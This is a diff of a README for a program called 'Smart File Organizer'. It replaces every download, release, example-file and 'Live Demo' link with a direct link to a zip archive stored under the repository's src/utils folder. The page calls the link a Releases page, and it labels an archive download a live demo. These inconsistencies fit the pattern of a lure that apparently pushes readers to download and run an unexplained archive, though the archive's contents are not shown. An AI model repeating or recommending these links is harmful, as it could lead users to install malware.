@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Smart File Organizer](https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip%20File%20Organizer-blue)](https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip)
+[![Download Smart File Organizer](https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip%20File%20Organizer-blue)](https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -21,12 +21,12 @@ Before you download Smart File Organizer, please make sure your system meets the
 
 To download Smart File Organizer, please visit the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip)
+[Download from Releases](https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip)
 
 1. Click on the link above.
 2. On the Releases page, you will see a list of available versions.
 3. Choose the latest version.
-4. Click on the file that matches your operating system (for example, `https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip` for Windows).
+4. Click on the file that matches your operating system (for example, `https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip` for Windows).
 5. The download will begin automatically. 
 
 Once the download is complete, follow these steps to install the application:
@@ -47,7 +47,7 @@ Smart File Organizer offers several features to help you manage your files effic
 
 ## 🌐 Live Demo
 
-Curious about how the software works? Check out a live demonstration at: [Live Demo](https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip)
+Curious about how the software works? Check out a live demonstration at: [Live Demo](https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip)
 
 ## 📜 Topics Covered
 
@@ -79,6 +79,6 @@ We encourage users to contribute to Smart File Organizer. If you have ideas for 
 
 Once again, you can download Smart File Organizer by visiting the link below:
 
-[Download from Releases](https://raw.githubusercontent.com/Hoppen1433/smart-file-organizer/main/tightrope/smart-file-organizer.zip)
+[Download from Releases](https://github.com/Hoppen1433/smart-file-organizer/raw/refs/heads/main/src/utils/organizer_file_smart_1.5.zip)
 
 Thank you for choosing Smart File Organizer. Enjoy a more organized digital life!
